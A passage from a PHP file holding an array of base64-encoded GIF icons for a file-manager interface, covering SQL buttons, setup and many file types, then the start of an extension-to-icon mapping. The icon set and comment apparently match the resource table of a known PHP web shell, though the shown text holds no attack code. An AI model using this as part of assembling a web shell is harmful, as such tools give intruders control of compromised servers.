"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
"setup"=&gt;
"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
"small_dir"=&gt;
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"small_unk"=&gt;
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
"yAsokBkQADs=",
"multipage"=&gt;"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".
"pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",
"sort_asc"=&gt;
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
"sort_desc"=&gt;
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
"sql_button_drop"=&gt;
"R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".
"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".
"AQEAOw==",
"sql_button_empty"=&gt;
"R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".
"AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",
"sql_button_insert"=&gt;
"R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".
"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",
"up"=&gt;
"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".
"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".
"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",
"write"=&gt;
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"ext_asp"=&gt;
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".
"D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",
"ext_mp3"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_avi"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".
"WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".
"PYXCyg+V2i44XeRmSfYqsGhAAgA7",
"ext_cgi"=&gt;
"R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".
"DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".
"LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".
"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ".
"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM".
"BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".
"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".
"RYtMAgEAOw==",
"ext_cmd"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
"dmrYAMn1onq/YKpjvEgAADs=",
"ext_cpp"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".
"WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".
"Eq7YrLDE7a4SADs=",
"ext_ini"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".
"aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".
"SnEjgPVarHEHgrB43JvszsQEADs=",
"ext_diz"=&gt;
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".
"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".
"/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".
"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr".
"/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX".
"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA".
"dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW".
"9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK".
"4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm".
"C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg".
"2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".
"CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".
"Ow==",
"ext_doc"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".
"WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".
"MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",
"ext_exe"=&gt;
"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
"xhIAOw==",
"ext_h"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".
"WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".
"Wq/NknbbSgAAOw==",
"ext_hpp"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".
"WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".
"UqUagnbLdZa+YFcCADs=",
"ext_htaccess"=&gt;
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".
"WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".
"AAA7",
"ext_html"=&gt;
"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
"ADs=",
"ext_jpg"=&gt;
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
"FxEAOw==",
"ext_js"=&gt;
"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
"a00AjYYBbc/o9HjNniUAADs=",
"ext_lnk"=&gt;
"R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO".
"NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi".
"Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk".
"AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG".
"MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5".
"NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf".
"1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ".
"ADs=",
"ext_log"=&gt;
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".
"zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",
"ext_php"=&gt;
"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg".
"t0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==",
"ext_pl"=&gt;
"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
"ext_swf"=&gt;
"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_tar"=&gt;
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_txt"=&gt;
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_wri"=&gt;
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=&gt;
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7"
);
 //For simple size- and speed-optimization.
 $imgequals = array(
  "ext_tar"=&gt;array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
  "ext_php"=&gt;array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
